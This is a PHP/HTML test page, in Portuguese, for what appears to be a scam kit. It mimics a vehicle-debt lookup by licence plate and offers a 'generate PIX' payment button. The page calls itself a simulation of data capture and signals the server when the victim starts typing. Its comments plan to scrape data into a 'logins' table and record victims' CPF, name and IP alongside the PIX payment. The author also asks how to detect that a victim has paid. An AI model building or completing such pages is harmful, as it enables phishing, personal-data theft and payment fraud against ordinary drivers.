<?php
// pages/teste/index.php

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Teste - Captura</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f9; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
        input[type="text"] { width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        button { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>

<div class="container">
    <h1>Chackal o Sinistro</h1>
    <h2>Consulta de Débitos (Teste)</h2>
    <p>Simulação de captura de dados.</p>
    
    <form id="formConsulta">
        <label for="placa">Digite a Placa:</label>
        <input type="text" id="placa" name="placa" placeholder="ABC-1234" required>
        
        <button type="submit">Consultar Débitos</button>
    </form>

    <div id="resultado" style="margin-top: 20px; display: none;">
        <h3>Resultado da Consulta:</h3>
        <p id="msgResultado"></p>
        
        <!-- Simulação do botão de gerar PIX que enviaria para data/pix.php -->
        <button id="btnGerarPix" style="background-color: #007bff; margin-top: 10px;">Gerar PIX de Teste (R$ 10,00)</button>
    </div>
</div>

<script>
    const inputPlaca = document.getElementById('placa');
    const formConsulta = document.getElementById('formConsulta');
    const resultado = document.getElementById('resultado');
    const msgResultado = document.getElementById('msgResultado');
    const btnGerarPix = document.getElementById('btnGerarPix');

    // 2. Simular a notificação de digitação (typing_status)
    inputPlaca.addEventListener('input', function() {
        if (this.value.length === 1) { // Dispara apenas na primeira letra para teste
            fetch('../../api/typing_start.php')
                .then(response => console.log('Status de digitação enviado.'))
                .catch(err => console.error('Erro ao enviar status de digitação.', err));
        }
    });

    // Simular o envio dos dados
    formConsulta.addEventListener('submit', function(e) {
        e.preventDefault();
        const placaValue = inputPlaca.value;
        
        msgResultado.textContent = `Consultando base de dados para a placa ${placaValue}... (Chackal Simulação concluída!)`;
        resultado.style.display = 'block';

        // Aqui, no fluxo real, você faria uma requisição para um arquivo em api/ (ex: api/consultaPlaca.php)
        // que faria o scraping e salvaria na tabela 'logins'.
    });

    //  Simular a requisição para o PIX
    btnGerarPix.addEventListener('click', function() {
        alert('Chakal Aqui seria feita uma requisição para pix passando CPF, Nome, Valor e IP para gerar o PIX e registrar na tabela table_data. OBS COMO VC DESCOBRE QUE O CARA PAGOU? BUG EM NAO TEM NADA DINAMICO');
    });
</script>

</body>
</html>
